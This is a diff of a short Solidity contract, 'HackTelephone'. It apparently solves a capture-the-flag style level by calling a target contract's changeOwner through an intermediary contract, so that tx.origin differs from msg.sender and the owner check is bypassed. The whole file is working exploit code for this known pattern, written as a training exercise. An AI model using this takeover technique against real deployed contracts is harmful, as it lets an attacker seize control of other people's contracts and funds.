@@ -4,9 +4,11 @@ pragma solidity ^0.8.0; // Latest solidity version
 import '../contracts/Telephone.sol';
 
 contract HackTelephone {
-    Telephone public originalContract = Telephone(0xc7Bc7aaa3fAde3d6963D07F88aB0185202F40194);
+    // Complete this value with the address of the instance
+    Telephone public originalContract = Telephone(0x2AfB4aCF90BE4088f3485Bf4C2Ba8F93a905C64B);
 
-    function changeOwner() public {
-        originalContract.changeOwner(0x68fB1897b169446968A7c2128D5025c387d14cC0);
+    // Call this function from a contract so the tx.origin it's gonna be different than the msg.sender
+    function changeOwner(address myAddress) public {
+        originalContract.changeOwner(myAddress);
     }
 }
